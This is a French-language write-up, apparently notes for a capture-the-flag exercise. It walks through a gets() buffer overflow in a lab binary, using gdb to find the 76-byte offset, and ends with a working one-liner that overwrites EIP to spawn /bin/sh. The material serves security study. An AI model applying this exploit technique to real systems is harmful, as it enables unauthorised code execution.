@@ -1,0 +1,47 @@
+**Buffer Overflow Code execution by shellcode injection**
+https://0xrick.github.io/binary-exploitation/bof5/
+https://en.wikipedia.org/wiki/Shellcode
+https://wiki.skullsecurity.org/index.php?title=Registers
+
+cat to keep shell open
+https://unix.stackexchange.com/questions/297560/cat-into-stdin-then-pipe-into-program-keeps-forked-shell-open-why
+
+
+On voit que la function gets est appelé (elle est vulnérable)
+On essaye de faire un exploit avec un buffer overflow
+
+On peut tester avec python ou perl pour trouvé la taille du buffer 
+>> python -c "print 'A' * 100" | ./level1
+>> perl -e 'print "A" x 100'
+
+Pour trouver le buffer avec gdb:
+	
+	On break apres le gets {b *0x08048495}
+	On break apres le gets => b *main+21
+	On run
+	On lui envoie une chaine de 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA' pour remplir le buffer
+	On cherche l'adresse EIP avec {info frame} >> 0xbffff70c
+	On cherche maintenant l'adresse du debut du buffer en affichant 24 mots au début de la stack avec {x/24wx $esp} ($esp = top of the stack)
+	On voit que la seconde ligne à l'adresse 0xbffff6c0 contient plein de 'A' (41), c'est le début du buffer
+	Dans gdb on fait la difference des 2 adresse pour obtenir la taille du buffer {p 0xbffff70c - 0xbffff6c0} = 76, eip - adresse du buffer = offset
+
+Maintenant avec objdump -t ./level1 | egrep '.text'
+on trouve une fonction run:
+08048444 g     F .text	0000003c              run
+dans gdb : disas run
+   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
+   0x08048479 <+53>:	call   0x8048360 <system@plt>
+
+(gdb) x/s 0x8048584
+0x8048584:	 "/bin/sh"
+
+On remplace l'adresse eip avec l'adresse de run pour executer un shell
+
+Nous somme en little endian. Il faut donc mettre l'adresse de run de telle manière :
+	adresse de run = '\x44\x84\x04\x08'
+
+On va d'abord remplir l'offset avec des 'A' pour arriver sur eip ensuite écraser cette adresse avec celle de run
+
+Il faut ajouter un cat pour garder stdin open
+
+(python -c "print 'A' * 76 + '\x44\x84\x04\x08'" ; cat) | ./level1
